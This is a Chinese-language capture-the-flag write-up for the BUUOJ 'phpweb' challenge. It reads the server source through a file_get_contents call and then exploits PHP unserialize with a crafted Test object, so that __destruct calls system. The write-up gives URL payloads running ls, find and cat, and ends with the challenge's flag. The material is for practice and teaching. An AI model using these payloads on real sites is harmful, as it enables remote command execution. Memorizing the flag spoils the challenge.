# [网鼎杯 2020 朱雀组]phpweb

[题目地址](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]phpweb)

进来一张图片直接怼脸。不知道要干啥，看源代码。

```html
<form  id=form1 name=form1 action="index.php" method=post>
    <input type=hidden id=func name=func value='date'>
    <input type=hidden id=p name=p value='Y-m-d h:i:s a'>
</body>
```

这一部分告诉我们往index.php发送post请求，一个参数叫func，另一个叫p。func？函数？结合网站有显示时间，data是php里显示时间的函数，怀疑这里传什么函数进去就执行什么函数，p是参数。我直接一个system，不行，被过滤了。那肯定要看看过滤了什么，平时跑fuzz，今天先尝试能不能直接读取源代码。

```
POST /index.php HTTP/1.1
Host: 3ac3edcc-4c13-48c6-a00b-cfc5d04e9c72.node4.buuoj.cn:81
Content-Length: 48
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://3ac3edcc-4c13-48c6-a00b-cfc5d04e9c72.node4.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://3ac3edcc-4c13-48c6-a00b-cfc5d04e9c72.node4.buuoj.cn:81/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

func=file_get_contents&p=/var/www/html/index.php
```

得到源代码。

```php
   <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

过滤得还挺多，然而没有过滤unserialize。在没有过滤的情况下，unserialize完全可以当成个shell来用。正好题目中有个Test类，处处都在暗示着是个反序列化漏洞。另外获取参数用的是_REQUEST，因此传get也行。

```php
class Test {
        var $p = "ls";
        var $func = "system";
}
$a=new Test();
echo urlencode(serialize($a));
```

注意unserialize漏洞的利用要求程序中一定要有反序列化后的类，比如这里提供了Test类，那我们就不能随机捏造一个这里没有的类。我们传进去的函数得以执行的关键在于[__destruct](http://c.biancheng.net/view/7504.html)，任何脚本运行结束之前会调用对象的析构函数。

- http://3ac3edcc-4c13-48c6-a00b-cfc5d04e9c72.node4.buuoj.cn:81/index.php?func=unserialize&p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A2%3A%22ls%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D
> bg.jpg index.php index.php

没有flag。没关系我们用[find](https://www.runoob.com/linux/linux-comm-find.html)命令从根目录开始找。

```php
class Test {
        var $p = "find / -name flag*";
        var $func = "system";
}
$a=new Test();
echo urlencode(serialize($a));
```

find /表示从根目录开始找；-name参数指定要查找的文件名；flag*模糊查询，找名字开头为flag的任何文件，如果直接-name flag就是精准匹配名字为flag的文件，万一flaga就找不到了，但是模糊查询可以。注意因为从根目录开始找，需要的时间比较多。

- http://3ac3edcc-4c13-48c6-a00b-cfc5d04e9c72.node4.buuoj.cn:81/index.php?func=unserialize&p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22find+%2F+-name+flag%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D

得到flag在`/tmp/flagoefiu4r93`。

```php
class Test {
        var $p = "cat /tmp/flagoefiu4r93";
        var $func = "system";
}
$a=new Test();
echo urlencode(serialize($a));
```

- http://3ac3edcc-4c13-48c6-a00b-cfc5d04e9c72.node4.buuoj.cn:81/index.php?func=unserialize&p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A22%3A%22cat+%2Ftmp%2Fflagoefiu4r93%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D

## Flag
> flag{ccd84867-86c9-40bb-8f46-5b28fb851f68} 